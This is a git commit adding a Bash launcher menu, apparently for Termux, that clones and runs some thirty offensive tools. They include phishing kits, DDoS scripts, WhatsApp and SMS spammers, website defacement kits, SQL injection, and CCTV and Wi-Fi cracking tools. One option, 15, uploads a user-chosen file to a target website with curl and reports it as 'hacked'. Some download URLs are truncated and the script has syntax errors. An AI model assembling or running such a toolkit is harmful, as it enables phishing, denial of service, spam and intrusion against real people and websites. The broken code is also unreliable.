e81628b87e90e5ec96db4dbc033f23b73e7de2d6
rikokusuma <45139021+rikokusuma@users.noreply.github.com>
2019-01-01 10:16:56 +0700

    Add files via upload

---
+++ LulMrTirexV2.sh
@@ -0,0 +1,651 @@
+#!/bin/bash
+#version 1.0
+#                        ******************
+#                        *  Mau Ngapain?  *
+#                        *     Recode?    *
+#                        *     Redit?     *
+#                        *   Izin Dulu :) *
+#                        ******************
+clear
+#variabels
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+sleep 1
+
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo "Loading... /";
+sleep 0.1;
+clear
+echo 'Loading... -';
+sleep 0.1;
+clear
+echo 'Loading... \';
+sleep 0.1;
+clear
+echo""
+echo""
+echo""
+echo""
+echo""
+toilet -f future " Welcome To My Tools " | lolcat
+sleep 5
+clear
+toilet -f standard " *LulMrTirex* " -F gay
+echo "============================================================= " | lolcat
+echo " Author      : LulMrTirex " | lolcat
+echo " Instagram   : rikokusuma12 " | lolcat
+echo " Facebook    : https://www.facebook.com/riko.kusuma.129" | lolcat
+echo " No Whatsapp : 089664215051 " | lolcat
+echo "============================================================ " | lolcat
+echo " Thanks To   : 2Lul Store Team " | lolcat
+echo " Thanks To   : Rabbit Cyber Team " | lolcat
+echo " Thanks To   : Lead Cyber Team " | lolcat
+echo " Thanks To   : Curut Cyber Team " | lolcat
+echo " Thanks To   : Indo Lion Cyber " | lolcat
+echo " Thanks To   : N.4.F " | lolcat
+echo " Thanks To   : Termux Indonesia " | lolcat
+echo "============================================================ " | lolcat
+echo " Version Tools : V2 " | lolcat
+echo "============================================================ " | lolcat
+
+echo $white "##################################"
+echo $white "# S I L A H K A N  D I P I L I H #"
+echo $white "##################################"
+
+###################################################
+# CTRL + C
+###################################################
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -b $green"[#]> (Ctrl + C ) Detected, Trying To Exit ...." | lolcat
+echo -b $green"[#]> MAKASIH UDH PAKE TOOLS GUE " |lolcat
+sleep 1
+echo ""
+echo -b $green"[#]> LulMrTirex Was Here" |lolcat
+
+echo -b $green"[#]> See you Again :)..." |lolcat
+sleep 1
+exit
+}
+
+lagi=1
+while [ $lagi -lt 6 ];
+do
+echo   $green  "1. Install LulMrTirex V1 "
+echo " <==============================================> " | lolcat
+echo   $blue   "2. Install Tuan Badut "
+echo " <==============================================> " | lolcat
+echo   $cyan   "3. Install Phising Game "
+echo " <==============================================> " | lolcat
+echo   $yellow "4. Instabot "
+echo " <==============================================> " | lolcat
+echo   $purple "5. Install Ubuntu "
+echo " <==============================================> " | lolcat
+echo   $green  "6. Install Admin-Finder "
+echo "<===============================================> " | lolcat
+echo   $blue   "7. Install Katolin "
+echo "<===============================================> " | lolcat
+echo   $cyan   "8. Install Lazymux "
+echo "<===============================================> " | lolcat
+echo   $yellow "9. RED-HAWK "
+echo "<===============================================> " | lolcat
+echo   $purple "10. Weeman "
+echo "<===============================================> " | lolcat
+echo   $green  "11. DDOS Torshammer "
+echo "<===============================================> " | lolcat
+echo   $blue   "12. LITEDDOS "
+echo "<===============================================> " | lolcat
+echo   $cyan   "13. Install BAJINGANv6 "
+echo "<===============================================> " | lolcat
+echo   $yellow "14. Install GadoGado "
+echo "<===============================================> " | lolcat
+echo   $purple "15. Webdav "
+echo "<===============================================> " | lolcat
+echo   $green  "16. LITESCRIPT "
+echo "<===============================================> " | lolcat
+echo   $blue   "17. viSQL "
+echo "<===============================================> " | lolcat
+echo   $cyan   "18. Metasploit "
+echo "<===============================================> " | lolcat
+echo   $yellow "19. Install Ngrok "
+echo "<===============================================> " | lolcat
+echo   $purple "20. JOOMSCAN "
+echo "<===============================================> " | lolcat
+echo   $green  "21. AOC SPAMMER "
+echo "<===============================================> " | lolcat
+echo   $blue   "22. Install Mr.Cakil "
+echo "<===============================================> " | lolcat
+echo   $cyan   "23. Install Santet Online "
+echo "<===============================================> " | lolcat
+echo   $yellow "24. Hack CCTV "
+echo "<===============================================> " | lolcat
+echo   $purple "25. iesDEFACE "
+echo "<===============================================> " | lolcat
+echo   $green  "26. Script Deface Creator "
+echo "<===============================================> " | lolcat
+echo   $blue   "27. Install Ko-Dork "
+echo "<===============================================> " | lolcat
+echo   $cyan   "28. Wifi-Hacker "
+echo "<===============================================> " | lolcat
+echo   $yellow "29. Spam Whatsapp "
+echo "<===============================================> " | lolcat
+echo   $purple "30. DDOS Attack "
+echo "<===============================================> " | lolcat
+echo   $red    "00. Keluar "
+echo $green
+read -p " root@LulMrTirex:~# " pil;
+
+case $pil in
+1) clear
+toilet -f standard " LulMrTirex " -F gay
+pkg update
+pkg upgrade
+pkg install python2
+pip2 install mechanize
+pkg install figlet
+pip2 install lolcat
+pkg install git
+git clone https://github.com/rikokusuma/LulMrTirex
+cd LulMrTirex
+sh LulMrTirex.sh
+
+;;
+
+2) clear
+toilet -f standard " LulMrTirex " -F gay
+apt update && apt upgrade
+pkg install python python2 vim figlet curl
+pkg install php
+pip2 install lolcat
+pkg install git
+git clone https://github.com/TUANB4DUT/TOOLSINSTALLERv1
+cd TOOLSINSTALLERv1
+chmod +x Tuanb4dut.sh
+sh Tuanb4dut.sh
+
+;;
+
+3) clear
+toilet -f standard " LulMrTirex " -F gay
+pkg install git
+pkg install python2
+git clone https://github.com/senitopeng/PhisingGame.git
+mv PhisingGame $HOME
+cd $HOME/PhisingGame
+python2 phising.py
+
+;;
+
+4) clear
+toilet -f standard " LulMrTirex " -F gay
+apt install git
+git clone https://github.com/verluchie/instabot.py
+cd instabot.py
+pip2 install -r requirements.txt
+python2 example.py
+
+;;
+
+5) clear
+toilet -f standard " LulMrTirex " -F gay
+apt update && apt upgrade
+apt install git
+apt install wget
+apt install proot
+git clone https://github.com/Neo-Oli/termux-ubuntu.git
+mv termux-ubuntu $HOME
+cd $HOME/~/termux-ubuntu
+chmod +x ubuntu.sh
+sh ubuntu.sh
+
+;;
+
+6) clear
+toilet -f standard " LulMrTirex " -F gay
+apt update && apt upgrade
+pkg install python2
+pkg install git
+git clone https://github.com/AdheBolo/AdminFinder
+ls
+cd AdminFinder
+chmod 777 AdminFinder.py
+python2 AdminFinder.py
+
+;;
+
+7) clear
+toilet -f standard " LulMrTirex " | lolcat
+pkg update
+pkg upgrade
+pkg install git
+pkg install python2
+pkg install nano
+pkg install gnupg
+git clone https://github.com/LionSec/katoolin.git
+ls
+cd katoolin
+ls
+python2 katoolin.py
+nano katoolin.py
+
+;;
+
+8) clear
+toilet -f standard " LulMrTirex " -F gay
+git clone https://github.com/Gameye98/Lazymux
+cd Lazymux
+python2 lazymux.py
+
+;;
+
+9) clear
+toilet -f standard " LulMrTirex " -F gay
+apt update && apt upgrade
+apt install php git
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+cd RED_HAWK
+chmod +x rhawk.php
+php rhawk.php
+
+;;
+
+10) clear
+toilet -f standard " LulMrTirex " -F gay
+pkg install git -y
+git clone https://github.com/samyoyo/weeman
+chmod +x weeman
+cd weeman
+sleep 1
+python2 weeman.py
+
+;;
+
+11) clear
+toilet -f standard " LulMrTirex " -F gay
+pkg update
+pkg upgrade
+pkg install python
+pkg install git
+git clone https://github.com/cyweb/hammer
+cd hammer
+python hammer.py
+
+;;
+
+12) clear
+toilet -f standard " LulMrTirex " -F gay
+git clone https://github.com/4L13199/LITEDDOS
+cd LITEDDOS
+python2 liteDDOS.py
+
+;;
+
+13) clear
+toilet -f standard " LulMrTirex " -F gay
+pkg update
+pkg upgrade
+pkg install pyhton2
+pip2 install --upgrade pip
+pkg install toilet
+pip2 install termcolor
+pip2 install lolcat
+pkg install git
+git clone https://github.com/DarknessCyberTeam/BAJINGANv6
+cd BAJINGANv6
+sh BAJINGAN.sh
+
+;;
+
+14) clear
+toilet -f standard " LulMrTirex " -F gay
+apt update && apt upgrade
+apt install ruby
+apt install lolcat
+apt install git
+git clone https://github.com/Senitopeng/GadoGado.git
+mv GadoGado $HOME
+cd $HOME/GadoGado
+bash gado
+
+;;
+
+15) clear
+toilet -f standard " LulMrTirex " -F gay
+cd /data/data/com.termux/files/home
+read -p "[?] Masukan Nama Script => " sc;
+read -p "[?] Masukan Web Target => " T;
+curl -T /sdcard/$sc $T
+echo "[!] Terhack => " $T/$sc | lolcat
+
+;;
+
+16) clear
+toilet -f standard " LulMrTirex " -F gay
+git clone https://github.com/4L13199/LITESCRIPT
+cd LITESCRIPT
+python2 LITESCRIPT.py
+
+;;
+
+17) clear
+toilet -f standard " LulMrTirex " -F gay
+apt install git
+git clone https://github.com/blackvkng/viSQL
+cd viSQL
+python2 -m pip install -r requirements.txt
+python2 viSQL.py
+python2 viSQL.py -t
+
+;;
+
+18) clear
+toilet -f standard " LulMrTirex " -F gay
+pkg update && pkg upgrade
+pkg install curl
+pkg install python
+pkg install python2
+curl -LO
+https://raw.githubusercontent.com/Techzindia/Metasploit_For_Termux/$
+chmod 777 metasploitTechzindia.sh
+cd metasploit-framework
+./msfconsole
+
+;;
+
+19) clear
+toilet -f standard " LulMrTirex " -F gay
+curl -S
+https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm$
+unzip ngrok-stable-linux-arm.zip
+./ngrok -h
+./ngrok http 8080
+./ngrok tcp 4444
+
+;;
+
+20) clear
+toilet -f standard " LulMrTirex " -F gay
+git clone https://github.com/rezasp/joomscan.git
+cd joomscan
+perl joomscan.pl
+
+;;
+
+21) clear
+toilet -f standard " LulMrTirex " -F gay
+apt update && apt upgrade
+pkg install git
+git clone https://github.com/rootM3eX/AOCSPAMMER
+cd AOCSPAMMER
+sh aocspam.sh
+
+;;
+
+22) clear
+toilet -f standard " LulMrTirex " -F gay
+git clone https://github.com/Mrcakil/mrcakil
+cd mrcakil
+chmod +x tools
+./tools
+
+;;
+
+23) clear
+toilet -f standard " LulMrTirex " -F gay
+apt update && upgrade
+apt istall python2
+apt install git
+git clone https://github.com/Gameye98/santet-online
+cd santet-online
+python2 santet.py
+
+;;
+
+24) clear
+toilet -f standard " LulMrTirex " -F gay
+apt update && apt upgrade
+pkg install python2
+pkg install git
+git clone https://github.com/kancotdiq/ipcs
+cd ipcs
+python2 scan.py
+
+;;
+
+25) clear
+toilet -f standard " LulMrTirex " -F gay
+apt install git
+apt install bash
+pip2 install bash
+git clone https://github.com/ALX-04/iesDEFACE
+mv iesDEFACE $HOME
+cd $HOME/iesDEFACE
+bash iesDeface.sh
+
+;;
+
+26) clear
+toilet -f standard " LulMrTirex " -F gay
+git clone https://github.com/Ubaii/script-deface-creator
+cd ~/script-deface-creator
+python2 create.py
+
+;;
+
+27) clear
+toilet -f standard " LulMrTirex " -F gay
+git clone https://github.com/ciku370/ko-dork
+cd ko-dork
+python2 dork.py
+
+;;
+
+28) clear
+toilet -f standard " LulMrTirex " -F gay
+git clone https://github.com/esc0rtd3w/wifi-hacker
+cd wifi-hacker
+sh wifi-hacker.sh
+
+;;
+
+29) clear
+toilet -f standard " LulMrTirex " -F gay
+git clone https://github.com/rikokusuma/LulMrTirex-SPAM
+cd LulMrTirex-SPAM
+php Spam.php
+
+;;
+
+30) clear
+toilet -f standard " LulMrTirex " -F gay
+git clone https://github.com/rikokusuma/LulMrTirex-DDOS
+cd LulMrTirex-DDOS
+python2 LulMrTirex-DDOS.py
+
+;;
+
+00) echo " Good Bye "
+sleep 1
+clear
+echo " System Shutdown "
+sleep 1
+clear
+echo " System Shutdown. "
+sleep 1
+clear
+echo " System Shutdown.. "
+sleep 1
+clear
+echo " System Shutdown... "
+sleep 1
+clear
+echo " System Shutdown.... "
+sleep 1
+clear
+echo " System Shutdown..... "
+echo " Noob Mah Bebas 😎 " | lolcat
+echo " [+] 2Lul Store Team [+] " | lolcat
+exit
+;;
+
+esac
+done
+done
